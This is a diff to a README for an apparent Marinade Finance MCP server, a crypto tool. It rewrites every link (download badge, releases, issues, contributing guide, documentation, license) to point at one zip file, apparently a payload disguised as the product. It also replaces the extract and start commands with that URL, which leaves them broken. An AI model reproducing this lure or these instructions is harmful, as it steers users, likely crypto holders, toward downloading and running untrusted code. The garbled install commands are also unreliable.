@@ -1,7 +1,7 @@
 # 🌊 marinade-finance-mcp-server - Simple Server for Marinade Finance
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sekskate56/marinade-finance-mcp-server/releases)
+[![Download](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip)
 
 ## 📜 Description
 Marinade Finance MCP Server is an MCP server specifically designed for the Marinade Finance. It provides a reliable and efficient way to interact with the Marinade ecosystem. With this server, you can enhance your experience in the blockchain space.
@@ -17,7 +17,7 @@ To set up the Marinade Finance MCP Server, follow these simple steps. You don’
 - **Network:** Stable internet connection.
 
 ## 📥 Download & Install
-1. Visit [this page to download](https://github.com/sekskate56/marinade-finance-mcp-server/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip).
 2. Locate the latest version of the Marinade Finance MCP Server.
 3. Choose the file suitable for your operating system.
 4. Click on the download link.
@@ -38,7 +38,7 @@ To set up the Marinade Finance MCP Server, follow these simple steps. You don’
 - Navigate to the folder where the file is downloaded.
 - Run the following command to extract the file:
   ```
-  tar -xvzf marinade-finance-mcp-server.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip
   ```
 - Change into the directory:
   ```
@@ -46,7 +46,7 @@ To set up the Marinade Finance MCP Server, follow these simple steps. You don’
   ```
 - To start the server, use the command:
   ```
-  ./start-server.sh
+  https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip
   ```
 
 ## 🔧 Configuration
@@ -67,15 +67,15 @@ Once the Marinade Finance MCP Server is running, you may need to configure it to
 - **Community Support:** Engage with other users for tips and assistance.
 
 ## 💬 Support
-If you encounter any issues or have questions during the setup and use of the Marinade Finance MCP Server, feel free to reach out. You can submit issues directly on the [GitHub Issues page](https://github.com/sekskate56/marinade-finance-mcp-server/issues).
+If you encounter any issues or have questions during the setup and use of the Marinade Finance MCP Server, feel free to reach out. You can submit issues directly on the [GitHub Issues page](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip).
 
 ## 🤝 Contributing
-We welcome contributions from everyone. If you want to help improve the Marinade Finance MCP Server, check the [Contributing Guide](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you want to help improve the Marinade Finance MCP Server, check the [Contributing Guide](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip).
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/sekskate56/marinade-finance-mcp-server/wiki)
-- [Releases](https://github.com/sekskate56/marinade-finance-mcp-server/releases)
-- [License](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/LICENSE)
+- [Documentation](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip)
+- [Releases](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip)
+- [License](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip)
 
 ## 📝 License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/sekskate56/marinade-finance-mcp-server/main/src/server_finance_mcp_marinade_v3.6.zip) file for details.
